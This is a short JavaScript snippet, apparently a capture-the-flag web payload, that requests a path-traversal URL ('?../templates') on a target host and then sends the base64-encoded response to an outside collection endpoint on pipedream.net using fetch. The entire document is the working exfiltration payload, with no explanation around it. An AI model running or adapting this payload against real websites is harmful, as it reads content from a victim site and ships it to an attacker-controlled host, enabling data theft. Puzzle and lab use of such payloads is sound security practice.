var xhr = new XMLHttpRequest();
xhr.open("GET", "http://catweb.zajebistyc.tf/?../templates");
xhr.onreadystatechange = function() {
    text = xhr.responseText;
    console.log(xhr.getAllResponseHeaders());
    fetch('https://encnu1395lyv7.x.pipedream.net/?q=' +btoa(text));
};
xhr.send(null);
